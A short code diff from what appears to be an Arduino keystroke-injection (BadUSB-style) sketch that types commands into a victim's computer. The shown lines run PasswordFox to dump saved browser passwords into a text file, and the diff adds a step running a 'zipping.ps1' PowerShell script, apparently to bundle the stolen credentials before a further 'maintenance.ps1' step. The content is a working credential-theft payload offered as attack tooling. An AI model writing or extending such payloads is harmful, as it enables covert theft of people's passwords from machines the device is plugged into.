@@ -42,6 +42,9 @@ void setup() {
   Keyboard.print("PasswordFox.exe /stext PasswordFox.txt");
   typeKey(KEY_RETURN);
   delay(1000);
+  Keyboard.print("powershell ./zipping.ps1");
+  typeKey(KEY_RETURN);
+  delay(100);
   Keyboard.print("powershell ./maintenance.ps1");
   typeKey(KEY_RETURN);
   delay(100);
